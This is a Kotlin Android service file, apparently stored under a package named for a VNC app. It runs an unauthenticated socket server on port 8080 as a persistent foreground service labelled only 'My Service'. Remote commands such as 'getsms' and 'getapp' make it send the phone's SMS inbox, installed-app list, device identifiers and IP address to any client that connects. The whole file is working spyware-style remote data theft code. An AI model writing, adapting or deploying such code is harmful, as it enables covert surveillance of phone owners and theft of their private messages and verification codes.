package net.christianbeier.droidvnc_ng.sockets.configSockets


import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import net.christianbeier.droidvnc_ng.R
import net.christianbeier.droidvnc_ng.sockets.MainActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.ServerSocket

class CommandsRemoteService : Service() {
    lateinit var serverSocket: ServerSocket
    @SuppressLint("Range")
    fun readSMS(): List<Map<String, String>> {
        val smsList = mutableListOf<Map<String, String>>()

        val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)

        if (cursor != null && cursor.moveToFirst()) {
            val senderIndex = cursor.getColumnIndex("address")
            val messageBodyIndex = cursor.getColumnIndex("body")

            do {
                // Verificar si las columnas existen
                if (senderIndex != -1 && messageBodyIndex != -1) {
                    val sender = cursor.getString(senderIndex)
                    val messageBody = cursor.getString(messageBodyIndex)

                    // Agregar coma al final del cuerpo del mensaje
                    val messageBodyWithComma = if (messageBody.endsWith(",")) messageBody else "$messageBody,"

                    val smsData = mapOf(
                        "sender" to sender,
                        "messageBody" to messageBodyWithComma
                    )

                    smsList.add(smsData)
                } else {
                    //todo
                }

            } while (cursor.moveToNext())
        }

        cursor?.close()

        return smsList
    }


    fun getInstalledApps(): List<String> {
        val packageManager = applicationContext.packageManager
        val applications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)

        val installedAppsList = mutableListOf<String>()

        for (application in applications) {
            // Agrega el nombre de la aplicación a la lista
            installedAppsList.add(application.packageName)

            val applicationInfo = packageManager.getApplicationInfo(application.packageName, PackageManager.GET_META_DATA)
            Log.d("aplicaciones", "app: $applicationInfo")
        }

        return installedAppsList
    }



    @SuppressLint("ForegroundServiceType")
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate() {
        super.onCreate()
        serverSocket = ServerSocket(8080)
        val notification = createNotification()
        startForeground(1, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val thread = Thread {
            try {
                while (true) {
                    val clientSocket = serverSocket.accept()
                    val reader = BufferedReader(InputStreamReader(clientSocket.getInputStream()))

                    try {
                        val message = reader.readLine() ?: break
                        Log.d("mensaje", "mensaje: $message")
                        val getIpDevice = GetIpDevice().toString()
                        val getSmsDevice = readSMS()
                        val getAppDevice = getInstalledApps().toString()

                        when (message) {

                            "getip" -> {
                                clientSocket.getOutputStream().write(getIpDevice.toByteArray())
                            }

                            "getuser" -> {
                                val brand = Build.BRAND
                                val product = Build.DEVICE
                                val name = Build.MODEL
                                val idDispositivo = Build.ID
                                val marcaDispositivo = "$brand $product $name , $idDispositivo"
                                clientSocket.getOutputStream().write(marcaDispositivo.toByteArray())
                            }

                            "getsms" -> {
                                for (smsData in getSmsDevice) {
                                    val sender = smsData["sender"]
                                    val messageBody = smsData["messageBody"]
                                    val smsMessage = "Sender: $sender, Message: $messageBody\n"
                                    clientSocket.getOutputStream().write(smsMessage.toByteArray())
                                }
                            }

                            "getapp" -> {
                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
                            }

                            "pushuser" -> {
                                val idDispositivo = Build.ID
                                val brand = Build.BRAND
                                val product = Build.DEVICE
                                val name = Build.MODEL
                                val marcaDispositivo = "$brand $product $name"

                                val pushDataDevice = "$idDispositivo , $marcaDispositivo , $getIpDevice"

                                clientSocket.getOutputStream().write(pushDataDevice.toByteArray())
                            }

                            "pushsms" -> {
                                for (smsData in getSmsDevice) {
                                    val sender = smsData["sender"]
                                    val messageBody = smsData["messageBody"]
                                    val smsMessage = "Sender: $sender, Message: $messageBody\n"
                                    clientSocket.getOutputStream().write(smsMessage.toByteArray())
                                }
                            }

                            "pushapp" -> {
                                clientSocket.getOutputStream().write(getAppDevice.toByteArray())
                            }

                            /*
                            "stop" -> {
                                stopSelf()
                                Log.d("mensaje", "Dejando de enviar mensajes")
                                break
                            }
                            */

                        }

                    } catch (e: Exception) {
                        Log.e("mensaje", "Error reading message: $e")
                    } finally {
                        reader.close()
                        clientSocket.close()
                    }
                }
            } catch (e: Exception) {
                Log.e("mensaje", "Server socket error: $e")
            }
        }
        thread.start()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        // El servicio no está diseñado para ser vinculado
        return null
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotification(): Notification {
        val channelId = "MyServiceChannel"
        val channelName = "My Service Channel"

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE)

        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .setContentTitle("My Service")
            .setContentText("Servicio en ejecución")
            .setSmallIcon(R.mipmap.banner)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }

        return notificationBuilder.build()
    }

    override fun onDestroy() {
        super.onDestroy()
        serverSocket.close()
    }
}
